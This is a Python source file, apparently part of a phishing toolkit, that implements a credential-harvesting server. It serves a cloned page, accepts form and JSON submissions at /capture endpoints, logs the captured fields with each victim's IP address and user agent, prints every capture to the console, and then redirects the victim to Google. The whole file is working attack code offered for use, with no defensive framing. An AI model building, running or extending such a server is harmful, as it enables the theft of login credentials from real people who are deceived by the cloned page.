"""
PhishServer — serves the cloned page, handles credential capture POSTs,
and logs submissions to SQLite via the Logger module.
"""

import os
import json
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs
from logger.logger import Logger

REDIRECT_URL = "https://www.google.com"   # where victim is sent after capture

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "..", "output")


class PhishHandler(SimpleHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        self.logger = Logger()
        super().__init__(*args, directory=OUTPUT_DIR, **kwargs)

    # ── silence default request log (we do our own) ──────────────────────────
    def log_message(self, format, *args):
        pass

    # ── routing ──────────────────────────────────────────────────────────────
    def do_GET(self):
        if self.path == "/redirect":
            self._redirect(REDIRECT_URL)
        else:
            super().do_GET()

    def do_POST(self):
        if self.path in ("/capture", "/capture-form"):
            self._handle_capture()
        else:
            self._respond(404, "Not found")

    # ── capture handlers ─────────────────────────────────────────────────────
    def _handle_capture(self):
        content_type = self.headers.get("Content-Type", "")
        length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(length)

        data = {}
        if "application/json" in content_type:
            try:
                data = json.loads(raw_body.decode("utf-8", errors="replace"))
            except Exception:
                pass
        elif "application/x-www-form-urlencoded" in content_type:
            parsed = parse_qs(raw_body.decode("utf-8", errors="replace"))
            data = {k: v[0] for k, v in parsed.items()}
        elif "multipart/form-data" in content_type:
            # basic multipart — extract text fields only
            body_str = raw_body.decode("utf-8", errors="replace")
            for part in body_str.split("--"):
                if 'name="' in part:
                    try:
                        name_start = part.index('name="') + 6
                        name_end = part.index('"', name_start)
                        field_name = part[name_start:name_end]
                        value = part.split("\r\n\r\n", 1)[-1].rstrip("\r\n--")
                        data[field_name] = value
                    except Exception:
                        pass

        if data:
            ip = self.client_address[0]
            ua = self.headers.get("User-Agent", "unknown")
            self.logger.save(data, ip=ip, user_agent=ua)
            self._print_capture(data, ip)

        # For JSON/fetch requests, return JSON so the JS can redirect
        if "application/json" in content_type:
            self._respond(200, json.dumps({"status": "ok"}), content_type="application/json")
        else:
            self._redirect("/redirect")

    def _print_capture(self, data: dict, ip: str):
        print(f"\n{'━'*52}")
        print(f"  ✓ CAPTURE from {ip}")
        print(f"{'─'*52}")
        for k, v in data.items():
            if v:  # skip empty fields
                print(f"  {k:<20} → {v}")
        print(f"{'━'*52}\n")

    # ── helpers ───────────────────────────────────────────────────────────────
    def _respond(self, code: int, body: str, content_type="text/plain"):
        encoded = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

    def _redirect(self, location: str):
        self.send_response(302)
        self.send_header("Location", location)
        self.end_headers()


class PhishServer:
    def __init__(self, port: int = 8080, directory: str = OUTPUT_DIR):
        self.port = port
        self.directory = directory

    def start(self):
        server = HTTPServer(("0.0.0.0", self.port), PhishHandler)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n\n[*] Server stopped.\n")
            server.shutdown()
